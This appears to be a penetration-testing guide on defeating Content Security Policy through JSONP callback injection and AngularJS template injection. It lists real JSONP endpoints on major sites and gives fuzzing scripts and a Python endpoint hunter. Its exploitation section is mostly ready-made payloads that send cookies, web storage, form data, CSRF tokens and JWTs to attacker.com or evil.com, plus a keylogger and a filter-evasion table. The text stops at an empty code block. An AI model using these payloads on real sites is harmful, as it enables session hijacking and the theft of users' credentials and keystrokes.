---
title: JSONP - AngularJS Bypasses
description: JSONP callback injection and AngularJS client-side template injection for arbitrary JavaScript execution under restrictive Content Security Policy.
navigation:
  icon: i-lucide-shield-off
  title: JSONP - AngularJS Bypasses
---

## Attack Theory

Content Security Policy enforces script origin restrictions. Two architectural weaknesses consistently collapse these controls: JSONP endpoints on whitelisted domains that mirror attacker-controlled callback names as executable JavaScript, and AngularJS template injection that evaluates expressions through its own parser independent of browser CSP enforcement.

::callout{icon="i-lucide-target" color="red"}
**Core Principle:** CSP trusts domains, not endpoints. A single JSONP endpoint or AngularJS library on any whitelisted domain gives full JavaScript execution regardless of how restrictive the remaining policy appears.
::

### Attack Flow Diagram

```text [JSONP CSP Bypass Flow]
┌──────────────┐     ┌──────────────────────┐     ┌───────────────────┐
│   Attacker   │────▶│   Injection Point     │────▶│  Victim Browser   │
│              │     │   (Reflected/Stored)  │     │                   │
└──────────────┘     └──────────────────────┘     └────────┬──────────┘
                                                           │
                              ┌─────────────────────────────┘
                              │
                              ▼
                     ┌──────────────────┐
                     │  CSP Evaluation  │
                     │  script-src:     │
                     │  *.google.com    │
                     │  cdnjs.cloud...  │
                     └────────┬─────────┘
                              │
                   ┌──────────┴──────────┐
                   │                     │
                   ▼                     ▼
          ┌────────────────┐   ┌─────────────────┐
          │  JSONP Path    │   │  AngularJS Path  │
          │                │   │                  │
          │ <script src=   │   │ Load angular.js  │
          │ "whitelisted/  │   │ from whitelisted │
          │  api?callback= │   │ CDN then inject  │
          │  alert(1)//">  │   │ {{expression}}   │
          └───────┬────────┘   └────────┬─────────┘
                  │                     │
                  ▼                     ▼
          ┌────────────────────────────────────┐
          │  JavaScript Execution in Victim    │
          │  Context (Same-Origin)             │
          │                                    │
          │  • Cookie Theft                    │
          │  • DOM Manipulation                │
          │  • Session Hijacking               │
          │  • Keylogging                      │
          │  • Credential Harvesting           │
          │  • CSRF Token Extraction           │
          └────────────────────────────────────┘
```

```text [AngularJS CSP Bypass Flow]
┌────────────────────────────────────────────────────────┐
│                   CSP Policy                           │
│  script-src 'self' cdnjs.cloudflare.com;               │
│  object-src 'none';                                    │
│  NO 'unsafe-inline'  NO 'unsafe-eval'                  │
└───────────────────────┬────────────────────────────────┘
                        │
                        ▼
┌────────────────────────────────────────────────────────┐
│  Step 1: Load AngularJS from whitelisted CDN           │
│  <script src="cdnjs.../angular.min.js"></script>       │
│  ✅ Allowed by CSP (cdnjs.cloudflare.com whitelisted)  │
└───────────────────────┬────────────────────────────────┘
                        │
                        ▼
┌────────────────────────────────────────────────────────┐
│  Step 2: Bootstrap Angular application                 │
│  <div ng-app>                                          │
│  ✅ Angular auto-bootstraps on ng-app directive        │
└───────────────────────┬────────────────────────────────┘
                        │
                        ▼
┌────────────────────────────────────────────────────────┐
│  Step 3: Template expression evaluation                │
│  {{$on.constructor('alert(document.domain)')()}}       │
│  ✅ Angular parser evaluates (not browser JS engine)   │
│  ✅ Bypasses script-src completely                     │
│  ✅ No 'unsafe-eval' needed (Angular internal parser)  │
└────────────────────────────────────────────────────────┘
```

```text [JSONP Callback Injection Mechanism]
Normal JSONP Response:
  GET /api?callback=handleData
  Response: handleData({"user":"admin","role":"user"})

Attacker JSONP Injection:
  GET /api?callback=alert(document.cookie)//
  Response: alert(document.cookie)//({"user":"admin","role":"user"})
                     │                  │
                     │                  └── Commented out by //
                     └── Executed as JavaScript!

CSP Perspective:
  ┌─────────────────────────────────────────┐
  │ <script src="whitelisted.com/api?       │
  │   callback=alert(document.cookie)//">   │
  │                                         │
  │ Origin: whitelisted.com ✅ (CSP allows) │
  │ Content: attacker-controlled ⚠️         │
  │ Result: Code execution 💥               │
  └─────────────────────────────────────────┘
```

---

## Phase 1 — CSP Reconnaissance

### Header Extraction

::tabs

:::tabs-item{icon="i-lucide-terminal" label="curl"}

```bash [Basic Extraction]
curl -sI https://target.com | grep -i "content-security-policy"
```

```bash [Follow Redirects]
curl -sIL https://target.com | grep -i "content-security-policy"
```

```bash [All Security Headers]
curl -sI https://target.com | grep -iE "content-security-policy|x-frame|x-content-type|strict-transport|x-xss"
```

```bash [Report-Only Headers Too]
curl -sI https://target.com | grep -iE "content-security-policy(-report-only)?"
```

:::

:::tabs-item{icon="i-lucide-terminal" label="httpie"}

```bash [httpie]
http --headers https://target.com | grep -i content-security-policy
```

:::

:::tabs-item{icon="i-lucide-terminal" label="nmap"}

```bash [nmap]
nmap -p 443 --script http-security-headers target.com
nmap -p 443 --script http-headers target.com | grep -i "content-security-policy"
```

:::

:::tabs-item{icon="i-lucide-terminal" label="wget"}

```bash [wget]
wget --server-response --spider https://target.com 2>&1 | grep -i content-security-policy
```

:::

:::tabs-item{icon="i-lucide-globe" label="Browser Console"}

```javascript [Console]
// Extract CSP from headers (via fetch)
fetch(location.href).then(r => console.log(r.headers.get('content-security-policy')))

// Extract CSP from meta tags
document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content

// Check if CSP is report-only
fetch(location.href).then(r => console.log(r.headers.get('content-security-policy-report-only')))
```

:::

::

### CSP Directive Parsing

```bash [Parse Directives]
# Break CSP into readable directives
curl -sI https://target.com | grep -i "content-security-policy" | \
  sed 's/content-security-policy: //i' | tr ';' '\n' | sed 's/^ //' | nl

# Extract only script-src
curl -sI https://target.com | grep -i content-security-policy | \
  grep -oP "script-src[^;]*"

# Extract only default-src
curl -sI https://target.com | grep -i content-security-policy | \
  grep -oP "default-src[^;]*"

# Extract all whitelisted domains
curl -sI https://target.com | grep -i content-security-policy | \
  grep -oP '[\w*][\w.-]+\.\w{2,}' | sort -u

# Check for dangerous directives
curl -sI https://target.com | grep -i content-security-policy | \
  grep -oP "'unsafe-inline'|'unsafe-eval'|data:|blob:|filesystem:|strict-dynamic|\*"
```

### Meta Tag CSP Extraction

```bash [Meta Tag CSP]
curl -s https://target.com | grep -oP '<meta[^>]*http-equiv=["\x27]Content-Security-Policy["\x27][^>]*content=["\x27]([^"\x27]*)["\x27]' -i
curl -s https://target.com | grep -oP 'content-security-policy[^"]*"[^"]*"' -i
```

### CSP Weakness Analysis Tools

::code-group

```bash [csp-evaluator API]
curl -s "https://csp-evaluator.withgoogle.com/getCSP" \
  -H "Content-Type: application/json" \
  -d '{"csp":"script-src self cdnjs.cloudflare.com *.google.com"}'
```

```bash [cspscanner]
python3 cspscanner.py -u https://target.com
python3 cspscanner.py -u https://target.com --format json
```

```bash [Retire.js (Library Detection)]
retire --js --outputformat json --url https://target.com
retire --js --jspath /path/to/downloaded/scripts/
```

```bash [csp-auditor]
# Burp Suite BApp Store extension
# Passive scan detects CSP weaknesses automatically
# Reports: JSONP on whitelisted domains, Angular availability
```

::

### Whitelisted Domain Enumeration

```bash [Domain Enumeration]
# Extract all script-src domains
CSP=$(curl -sI https://target.com | grep -i "content-security-policy" | sed 's/.*content-security-policy: //i')
echo "$CSP" | grep -oP "(?:script-src|default-src)[^;]*" | grep -oP '[\w*][\w.-]+\.\w{2,}' | sort -u | tee csp_domains.txt

# Resolve wildcards
while read domain; do
  if [[ "$domain" == \** ]]; then
    base=$(echo "$domain" | sed 's/^\*\.//')
    echo "[*] Wildcard: $domain — Enumerating subdomains of $base"
    subfinder -d "$base" -silent | head -20
  else
    echo "[*] Fixed: $domain"
  fi
done < csp_domains.txt

# Check each domain for JSONP and Angular
while read domain; do
  clean=$(echo "$domain" | sed 's/^\*\.//')
  echo "=== $clean ==="
  
  # JSONP check
  curl -s "https://$clean" 2>/dev/null | grep -qi "callback\|jsonp\|cb=" && echo "  [+] JSONP indicators found"
  
  # Angular check
  curl -s "https://$clean" 2>/dev/null | grep -qi "angular" && echo "  [+] AngularJS indicators found"
  
done < csp_domains.txt
```

---

## Phase 2 — JSONP Endpoint Discovery

### Vulnerable CSP Patterns

::warning
Any of these CSP patterns can be exploited if the whitelisted domain serves a JSONP endpoint. Even a single subdomain match is sufficient.
::

::collapsible

| CSP Directive | Risk Level | Bypass Vector |
| --- | --- | --- |
| `script-src *.google.com` | Critical | Multiple JSONP endpoints available |
| `script-src *.googleapis.com` | Critical | Angular CDN + multiple API endpoints |
| `script-src cdnjs.cloudflare.com` | Critical | Any library including Angular |
| `script-src cdn.jsdelivr.net` | Critical | Any npm package including Angular |
| `script-src unpkg.com` | Critical | Any npm package including Angular |
| `script-src *.gstatic.com` | High | Google hosted resources |
| `script-src *.facebook.com` | High | Facebook API JSONP |
| `script-src *.youtube.com` | High | YouTube API callbacks |
| `script-src *.twitter.com` | High | Syndication JSONP |
| `script-src accounts.google.com` | High | OAuth JSONP endpoint |
| `script-src maps.googleapis.com` | High | Maps API callback |
| `script-src *.yahoo.com` | High | Search suggestion JSONP |
| `script-src *.yimg.com` | Medium | Yahoo image CDN |
| `script-src *.akamaihd.net` | Medium | Various customer APIs |
| `script-src *.cloudfront.net` | Medium | Various customer APIs |
| `script-src *.azureedge.net` | Medium | Azure CDN hosted scripts |
| `script-src *.amazonaws.com` | Medium | S3/CloudFront hosted scripts |
| `script-src *.herokuapp.com` | Critical | Attacker can deploy JSONP app |
| `script-src *.github.io` | Critical | Attacker can create pages |
| `script-src *.netlify.app` | Critical | Attacker can deploy site |
| `script-src *.vercel.app` | Critical | Attacker can deploy site |
| `script-src *.firebaseapp.com` | Critical | Attacker can create project |
| `script-src *.azurewebsites.net` | Critical | Attacker can deploy app |
| `script-src 'self'` | Varies | Self-hosted JSONP endpoints |
| `script-src data:` | Critical | Direct JS execution via data URI |
| `script-src blob:` | High | Blob URL execution |
| `script-src 'unsafe-inline'` | Critical | Direct inline script |
| `script-src 'unsafe-eval'` | Critical | eval/Function available |
| `default-src 'self' *` | Critical | Any external domain |

::

### JSONP Endpoint Database

::tabs

:::tabs-item{icon="i-simple-icons-google" label="Google"}

::code-collapse

```text [Google JSONP Endpoints]
# OAuth / Accounts
https://accounts.google.com/o/oauth2/revoke?callback=CALLBACK
https://accounts.google.com/o/oauth2/postmessageRelay?callback=CALLBACK

# Search / Suggest
https://www.google.com/complete/search?client=chrome&q=test&callback=CALLBACK
https://www.google.com/complete/search?client=hp&q=test&callback=CALLBACK
https://www.google.com/complete/search?client=firefox&q=test&callback=CALLBACK
https://suggestqueries.google.com/complete/search?client=chrome&q=test&callback=CALLBACK
https://clients1.google.com/complete/search?client=youtube&q=test&callback=CALLBACK

# APIs
https://www.googleapis.com/customsearch/v1?callback=CALLBACK
https://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=test&callback=CALLBACK
https://www.google.com/jsapi?callback=CALLBACK
https://maps.googleapis.com/maps/api/js?callback=CALLBACK
https://translate.googleapis.com/translate_a/l?client=dict-chrome-ex&callback=CALLBACK

# Custom Search Engine
https://cse.google.com/api/007627024705/cse/callback=CALLBACK
https://www.google.com/cse?callback=CALLBACK

# Tag Manager (script execution)
https://www.googletagmanager.com/gtm.js?id=GTM-XXXXXX

# Google Ads
https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?callback=CALLBACK
https://www.googleadservices.com/pagead/conversion.js?callback=CALLBACK

# YouTube
https://www.youtube.com/oembed?url=https://youtube.com/watch?v=dQw4w9WgXcQ&format=json&callback=CALLBACK
https://clients1.google.com/complete/search?client=youtube&q=test&jsonp=CALLBACK

# Google Books
https://books.google.com/books?bibkeys=ISBN:0451526538&jscmd=viewapi&callback=CALLBACK

# Google Feeds
https://ajax.googleapis.com/ajax/services/feed/load?v=1.0&q=https://news.google.com/rss&callback=CALLBACK
```

::

:::

:::tabs-item{icon="i-simple-icons-facebook" label="Facebook / Meta"}

::code-collapse

```text [Facebook JSONP Endpoints]
# Graph API
https://graph.facebook.com/?callback=CALLBACK
https://graph.facebook.com/v18.0/?callback=CALLBACK
https://graph.facebook.com/me?callback=CALLBACK

# Connect
https://www.facebook.com/connect/ping?callback=CALLBACK
https://www.facebook.com/ajax/haste-response?callback=CALLBACK

# SDK (script loading)
https://connect.facebook.net/en_US/sdk.js
https://connect.facebook.net/en_US/all.js#xfbml=1&callback=CALLBACK

# Instagram
https://api.instagram.com/v1/tags/test/media/recent?callback=CALLBACK
https://www.instagram.com/web/search/topsearch/?query=test&callback=CALLBACK
```

::

:::

:::tabs-item{icon="i-simple-icons-x" label="Twitter / X"}

```text [Twitter JSONP Endpoints]
# Syndication
https://syndication.twitter.com/tweets.json?callback=CALLBACK
https://syndication.twitter.com/timeline/profile?callback=CALLBACK

# URL Count (legacy)
https://api.twitter.com/1/urls/count.json?url=test&callback=CALLBACK

# CDN Resources
https://cdn.syndication.twimg.com/widgets/followbutton/info.json?callback=CALLBACK
https://platform.twitter.com/widgets.js
```

:::

:::tabs-item{icon="i-simple-icons-microsoft" label="Microsoft"}

```text [Microsoft JSONP Endpoints]
# Azure / Microsoft Online
https://login.microsoftonline.com/common/oauth2/logout?callback=CALLBACK
https://login.live.com/oauth20_logout.srf?callback=CALLBACK

# Bing
https://www.bing.com/HPImageArchive.aspx?format=js&callback=CALLBACK
https://api.bing.com/osjson.aspx?query=test&JsonCallback=CALLBACK
https://www.bing.com/AS/Suggestions?qry=test&cb=CALLBACK

# LinkedIn
https://www.linkedin.com/countserv/count/share?url=test&callback=CALLBACK
```

:::

:::tabs-item{icon="i-lucide-globe" label="Various Services"}

::code-collapse

```text [Other JSONP Endpoints]
# Wikipedia / Wikimedia
https://en.wikipedia.org/w/api.php?action=opensearch&format=json&callback=CALLBACK&search=test
https://en.wikipedia.org/w/api.php?action=query&format=json&callback=CALLBACK&titles=Main_Page
https://commons.wikimedia.org/w/api.php?action=query&format=json&callback=CALLBACK

# Yahoo
https://search.yahoo.com/sugg/os?callback=CALLBACK&command=test
https://query.yahooapis.com/v1/public/yql?q=test&format=json&callback=CALLBACK
https://geo.yahoo.com/counters?callback=CALLBACK

# Flickr
https://api.flickr.com/services/feeds/photos_public.gne?format=json&jsoncallback=CALLBACK
https://api.flickr.com/services/rest/?method=flickr.test.echo&format=json&jsoncallback=CALLBACK

# GitHub
https://gist.github.com/user/id.json?callback=CALLBACK
https://api.github.com/?callback=CALLBACK
https://api.github.com/users/octocat?callback=CALLBACK

# Tumblr
https://api.tumblr.com/v2/blog/test.tumblr.com/info?callback=CALLBACK
https://*.tumblr.com/api/read/json?callback=CALLBACK

# Reddit
https://www.reddit.com/r/all.json?jsonp=CALLBACK
https://www.reddit.com/api/info.json?url=test&jsonp=CALLBACK
https://buttons.reddit.com/button_info.json?url=test&jsonp=CALLBACK

# Pinterest
https://api.pinterest.com/v1/urls/count.json?url=test&callback=CALLBACK
https://widgets.pinterest.com/v3/pidgets/pins/info/?pin_ids=1&callback=CALLBACK

# WordPress
https://public-api.wordpress.com/rest/v1/sites/test/posts?callback=CALLBACK
https://stats.wordpress.com/e-test.js?callback=CALLBACK

# Disqus
https://disqus.com/api/3.0/threads/set.jsonp?thread=test&forum=test&callback=CALLBACK

# Spotify
https://open.spotify.com/oembed?url=https://open.spotify.com/track/test&callback=CALLBACK

# Medium
https://medium.com/oembed?url=https://medium.com/test&callback=CALLBACK

# Vimeo
https://vimeo.com/api/oembed.json?url=https://vimeo.com/1&callback=CALLBACK

# Dailymotion
https://api.dailymotion.com/video/test?callback=CALLBACK

# SoundCloud
https://soundcloud.com/oembed?url=https://soundcloud.com/test&format=json&callback=CALLBACK

# Shopify
https://*.myshopify.com/products.json?callback=CALLBACK

# CDN-hosted JSONP
https://cdn.rawgit.com/user/repo/branch/file.js
https://raw.githack.com/user/repo/branch/file.js
```

::

:::

:::tabs-item{icon="i-lucide-package" label="CDNs (Script Loading)"}

```text [CDN Script Endpoints]
# These CDNs allow loading ANY published library including AngularJS

# cdnjs (Cloudflare)
https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js
https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js
https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.js
https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js
https://cdnjs.cloudflare.com/ajax/libs/ember.js/2.18.2/ember.debug.js
https://cdnjs.cloudflare.com/ajax/libs/vue/2.7.14/vue.js
https://cdnjs.cloudflare.com/ajax/libs/dojo/1.17.3/dojo.js

# jsDelivr
https://cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js
https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js
https://cdn.jsdelivr.net/gh/user/repo@version/file.js

# unpkg
https://unpkg.com/angular@1.6.0/angular.min.js
https://unpkg.com/angular@1.8.3/angular.min.js

# Google Hosted Libraries
https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js
https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js
https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js

# code.angularjs.org
https://code.angularjs.org/1.6.0/angular.min.js
https://code.angularjs.org/1.8.3/angular.min.js

# Microsoft CDN
https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.7.1.min.js

# Bootstrap CDN
https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js
```

:::

::

### Automated JSONP Discovery

::tabs

:::tabs-item{icon="i-lucide-search" label="Fuzzing"}

```bash [Endpoint Fuzzing with ffuf]
# Fuzz API paths for JSONP
ffuf -u "https://whitelisted-domain.com/FUZZ?callback=CSPtest" \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200 -mr "CSPtest\(" -o jsonp_results.json -of json

# Fuzz with multiple wordlists
ffuf -u "https://whitelisted-domain.com/FUZZ?callback=CSPtest" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200 -mr "CSPtest\(" -t 50

# Fuzz common API versioned paths
for v in v1 v2 v3 api; do
  ffuf -u "https://whitelisted-domain.com/$v/FUZZ?callback=CSPtest" \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -mc 200 -mr "CSPtest\(" -t 30
done
```

:::

:::tabs-item{icon="i-lucide-search" label="Parameter Brute"}

```bash [JSONP Parameter Discovery]
# Common JSONP parameter names
PARAMS=(callback jsonp cb jsonpcallback jsoncallback _callback _jsonp func function call handler jsonpCallback JSONP Callback _cb oncomplete done loaded _func jp _jp jcb)

TARGET="https://whitelisted-domain.com/api/endpoint"

for param in "${PARAMS[@]}"; do
  RESP=$(curl -s "$TARGET?${param}=CSPbypass123" 2>/dev/null)
  if echo "$RESP" | grep -q "CSPbypass123("; then
    echo "[+] JSONP FOUND: ${param} parameter at $TARGET"
    echo "    Response: $(echo "$RESP" | head -c 300)"
    echo ""
  fi
done
```

:::

:::tabs-item{icon="i-lucide-history" label="Historical Data"}

```bash [Wayback / GAU Discovery]
# GAU - GetAllUrls
gau whitelisted-domain.com | grep -iE "\?(callback|jsonp|cb|_callback|jsonpcallback)=" | sort -u | tee gau_jsonp.txt

# Wayback Machine
waybackurls whitelisted-domain.com | grep -iE "\?(callback|jsonp|cb|_callback)=" | sort -u | tee wayback_jsonp.txt

# Verify discovered endpoints
while read url; do
  TEST_URL=$(echo "$url" | sed 's/callback=[^&]*/callback=CSPtest/' | sed 's/jsonp=[^&]*/jsonp=CSPtest/' | sed 's/cb=[^&]*/cb=CSPtest/')
  RESP=$(curl -s "$TEST_URL" 2>/dev/null | head -c 100)
  echo "$RESP" | grep -q "CSPtest(" && echo "[+] Valid: $TEST_URL"
done < gau_jsonp.txt

# Katana spider
katana -u https://whitelisted-domain.com -d 3 -jc | grep -iE "callback=|jsonp=|cb=" | sort -u

# ParamSpider
python3 paramspider.py -d whitelisted-domain.com | grep -iE "callback|jsonp|cb"
```

:::

:::tabs-item{icon="i-lucide-code" label="Python Script"}

```python [jsonp_hunter.py]
#!/usr/bin/env python3
"""JSONP Endpoint Hunter for CSP Bypass"""

import requests
import sys
import concurrent.futures
from urllib.parse import urljoin

JSONP_PARAMS = [
    'callback', 'jsonp', 'cb', 'jsonpcallback', 'jsoncallback',
    '_callback', '_jsonp', 'func', 'function', 'call', 'handler',
    'jsonpCallback', 'JSONP', 'Callback', '_cb', 'jp', 'jcb',
    'oncomplete', 'done', 'loaded', '_func'
]

PATHS = [
    '/', '/api', '/api/v1', '/api/v2', '/search', '/suggest',
    '/complete', '/autocomplete', '/oauth', '/login', '/v1', '/v2',
    '/json', '/data', '/feed', '/rss', '/embed', '/oembed',
    '/widget', '/widgets', '/count', '/share', '/info',
    '/ping', '/status', '/health', '/user', '/users',
    '/me', '/profile', '/config', '/settings', '/lookup'
]

MARKER = 'CSPbypassHunter9876'

def check_jsonp(domain, path, param):
    url = f"https://{domain}{path}?{param}={MARKER}"
    try:
        r = requests.get(url, timeout=5, allow_redirects=True,
                        headers={'User-Agent': 'Mozilla/5.0'})
        if f'{MARKER}(' in r.text or f'{MARKER} (' in r.text:
            return (url, r.text[:300])
    except:
        pass
    return None

def main():
    domain = sys.argv[1]
    print(f"[*] Hunting JSONP endpoints on: {domain}")
    print(f"[*] Testing {len(PATHS)} paths × {len(JSONP_PARAMS)} params = {len(PATHS)*len(JSONP_PARAMS)} requests")

    found = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = {}
        for path in PATHS:
            for param in JSONP_PARAMS:
                f = executor.submit(check_jsonp, domain, path, param)
                futures[f] = (path, param)

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                url, preview = result
                print(f"\n[+] JSONP FOUND: {url}")
                print(f"    Preview: {preview}\n")
                found.append(url)

    print(f"\n[*] Total JSONP endpoints found: {len(found)}")
    for u in found:
        print(f"  {u}")

if __name__ == '__main__':
    main()
```

:::

::

---

## Phase 3 — JSONP Exploitation

### Basic JSONP Payloads

::code-group

```html [Alert PoC]
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)//"></script>
```

```html [Google Search Suggest]
<script src="https://www.google.com/complete/search?client=chrome&q=test&callback=alert(1)//"></script>
```

```html [Wikipedia]
<script src="https://en.wikipedia.org/w/api.php?action=opensearch&format=json&callback=alert(document.cookie)//&search=test"></script>
```

```html [Flickr]
<script src="https://api.flickr.com/services/feeds/photos_public.gne?format=json&jsoncallback=alert(1)//"></script>
```

::

### Data Exfiltration via JSONP

::tabs

:::tabs-item{icon="i-lucide-cookie" label="Cookie Theft"}

```html [Cookie Exfiltration Methods]
<!-- fetch() method -->
<script src="https://whitelisted.com/api?callback=fetch('https://attacker.com/steal?c='.concat(document.cookie))//"></script>

<!-- Image beacon method -->
<script src="https://whitelisted.com/api?callback=new Image().src='https://attacker.com/steal?c='.concat(document.cookie)//"></script>

<!-- XMLHttpRequest method -->
<script src="https://whitelisted.com/api?callback=var x=new XMLHttpRequest();x.open('GET','https://attacker.com/steal?c='.concat(document.cookie));x.send();//"></script>

<!-- Navigator.sendBeacon method -->
<script src="https://whitelisted.com/api?callback=navigator.sendBeacon('https://attacker.com/steal',document.cookie)//"></script>

<!-- WebSocket method -->
<script src="https://whitelisted.com/api?callback=var ws=new WebSocket('wss://attacker.com/ws');ws.onopen=function(){ws.send(document.cookie)}//"></script>
```

:::

:::tabs-item{icon="i-lucide-database" label="Storage Theft"}

```html [LocalStorage / SessionStorage]
<!-- LocalStorage -->
<script src="https://whitelisted.com/api?callback=fetch('https://attacker.com/s?ls='.concat(btoa(JSON.stringify(localStorage))))//"></script>

<!-- SessionStorage -->
<script src="https://whitelisted.com/api?callback=fetch('https://attacker.com/s?ss='.concat(btoa(JSON.stringify(sessionStorage))))//"></script>

<!-- Both storages -->
<script src="https://whitelisted.com/api?callback=fetch('https://attacker.com/s',{method:'POST',body:JSON.stringify({ls:localStorage,ss:sessionStorage})})//"></script>

<!-- IndexedDB enumeration -->
<script src="https://whitelisted.com/api?callback=indexedDB.databases().then(dbs=>fetch('https://attacker.com/idb?d='.concat(JSON.stringify(dbs))))//"></script>
```

:::

:::tabs-item{icon="i-lucide-file-text" label="DOM Content"}

```html [DOM Extraction]
<!-- Full page HTML -->
<script src="https://whitelisted.com/api?callback=fetch('https://attacker.com/dom',{method:'POST',body:document.documentElement.outerHTML})//"></script>

<!-- Form data -->
<script src="https://whitelisted.com/api?callback=fetch('https://attacker.com/f',{method:'POST',body:JSON.stringify([...document.querySelectorAll('input')].map(i=>({name:i.name,value:i.value,type:i.type})))})//"></script>

<!-- CSRF tokens -->
<script src="https://whitelisted.com/api?callback=fetch('https://attacker.com/csrf?t='.concat(document.querySelector('[name=csrf_token],[name=_token],[name=authenticity_token]')?.value))//"></script>

<!-- URL and referrer -->
<script src="https://whitelisted.com/api?callback=fetch('https://attacker.com/u?url='.concat(encodeURIComponent(location.href),'%26ref=',encodeURIComponent(document.referrer)))//"></script>
```

:::

:::tabs-item{icon="i-lucide-key" label="Token Extraction"}

```html [JWT / API Keys]
<!-- JWT from localStorage -->
<script src="https://whitelisted.com/api?callback=fetch('https://attacker.com/jwt?t='.concat(localStorage.getItem('token')||localStorage.getItem('jwt')||localStorage.getItem('access_token')))//"></script>

<!-- Authorization headers from meta -->
<script src="https://whitelisted.com/api?callback=fetch('https://attacker.com/meta?d='.concat(btoa(document.querySelector('meta[name=api-key],meta[name=csrf-token]')?.content)))//"></script>

<!-- Fetch a page and extract tokens -->
<script src="https://whitelisted.com/api?callback=fetch('/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.com/api?d='.concat(btoa(d))))//"></script>
```

:::

:::tabs-item{icon="i-lucide-monitor" label="Keylogger"}

```html [Keylogger via JSONP]
<script src="https://whitelisted.com/api?callback=var k='';document.onkeypress=function(e){k+=e.key;if(k.length>20){fetch('https://attacker.com/keys?k='.concat(k));k=''}}//"></script>
```

:::

::

### Advanced JSONP Callback Manipulation

::code-group

```html [Dot Notation]
<script src="https://whitelisted.com/api?callback=window.alert"></script>
<script src="https://whitelisted.com/api?callback=window.opener.alert"></script>
<script src="https://whitelisted.com/api?callback=parent.alert"></script>
<script src="https://whitelisted.com/api?callback=top.alert"></script>
```

```html [Multi-Statement Callbacks]
<script src="https://whitelisted.com/api?callback=var a=1;alert(document.cookie)//"></script>
<script src="https://whitelisted.com/api?callback=void(fetch('https://attacker.com/c?'+document.cookie))//"></script>
```

```html [Encoded Callbacks]
<!-- URL encoded -->
<script src="https://whitelisted.com/api?callback=%61%6c%65%72%74(1)//"></script>
<!-- Double encoded -->
<script src="https://whitelisted.com/api?callback=%2561lert(1)//"></script>
<!-- Unicode -->
<script src="https://whitelisted.com/api?callback=\u0061lert(1)//"></script>
```

```html [Constructor Chain]
<script src="https://whitelisted.com/api?callback=[].constructor.constructor('alert(1)')()//"></script>
<script src="https://whitelisted.com/api?callback=Function('alert(1)')()//"></script>
```

```html [Path-Based Callback]
<script src="https://whitelisted.com/jsonp/alert(1)//"></script>
<script src="https://whitelisted.com/api/v1/alert(document.domain)//"></script>
```

::

### JSONP Callback Character Filter Bypass

::collapsible

| Filter | Bypass | Payload |
| --- | --- | --- |
| Parentheses `()` blocked | Backtick template | `alert`1`//` |
| `alert` blocked | `confirm` / `prompt` | `confirm(1)//` or `prompt(1)//` |
| `alert` blocked | `window` bracket | `window['al'+'ert'](1)//` |
| `alert` blocked | `Reflect.apply` | `Reflect.apply(alert,window,[1])//` |
| `alert` blocked | `self` access | `self['al'+'ert'](1)//` |
| `alert` blocked | `top` access | `top['al'+'ert'](1)//` |
| Dots blocked | Bracket notation | `window['alert'](1)//` |
| Single quotes blocked | Double quotes | `alert("xss")//` |
| Double quotes blocked | Backticks | `` alert(`xss`)// `` |
| Both quotes blocked | `String.fromCharCode` | `alert(String.fromCharCode(88,83,83))//` |
| `fetch` blocked | `XMLHttpRequest` | `var x=new XMLHttpRequest();x.open('GET','https://evil.com/?'+document.cookie);x.send()//` |
| `fetch` blocked | `Image` beacon | `new Image().src='https://evil.com/?'+document.cookie//` |
| `document` blocked | `self.document` | `self['docu'+'ment'].cookie//` |
| Forward slash `//` blocked | `/**/` comment | `alert(1)/*` |
| Semicolons blocked | Comma operator | `alert(1),void 0` |
| `eval` blocked | `Function` constructor | `Function('alert(1)')()//` |
| `Function` blocked | Constructor chain | `[].constructor.constructor('alert(1)')()//` |
| Length limit | Short payloads | `alert()//` or `alert``//` |

::

---

## Phase 4 — AngularJS CSP Bypass

### AngularJS Detection

::tabs

:::tabs-item{icon="i-lucide-terminal" label="CLI Detection"}

```bash [Detection Commands]
# Check for Angular in page source
curl -s https://target.com | grep -oiP '(angular[.\w-]*\.js|ng-app|data-ng-app|ng-csp|ng-controller|ng-model|ng-bind|ng-click)' | sort -u

# Find Angular CDN URLs
curl -s https://target.com | grep -oP 'https?://[^"'\''> ]*angular[^"'\''> ]*\.js' | sort -u

# Check Angular version
curl -s https://target.com | grep -oP 'angular[.\w-]*\.js' | head -1
curl -s https://target.com | grep -oP 'angularjs/[\d.]+' | head -1

# Find Angular version from CDN
VER=$(curl -s https://target.com | grep -oP '(?:angular(?:js)?[/.])([\d.]+)' | head -1)
echo "Angular version: $VER"

# Check for ng-csp directive
curl -s https://target.com | grep -oP 'ng-csp|data-ng-csp' && echo "[!] ng-csp present"

# Wappalyzer
wappalyzer https://target.com 2>/dev/null | jq '.technologies[] | select(.name | test("Angular"; "i"))'
```

:::

:::tabs-item{icon="i-lucide-globe" label="Browser Console"}

```javascript [Console Detection]
// Check if Angular is loaded
typeof angular !== 'undefined' && angular.version

// Full version object
angular.version

// Get Angular version string
angular.version.full

// Check ng-csp
document.querySelector('[ng-csp], [data-ng-csp]')

// Find all Angular directives in page
document.querySelectorAll('[ng-app], [data-ng-app], [x-ng-app], [ng_app]')

// List all registered modules
angular.module('ng').requires

// Check if sandbox is present (< 1.6)
angular.version.minor < 6 ? 'Sandbox present' : 'No sandbox (1.6+)'
```

:::

:::tabs-item{icon="i-lucide-scan" label="Nuclei"}

```bash [Nuclei Templates]
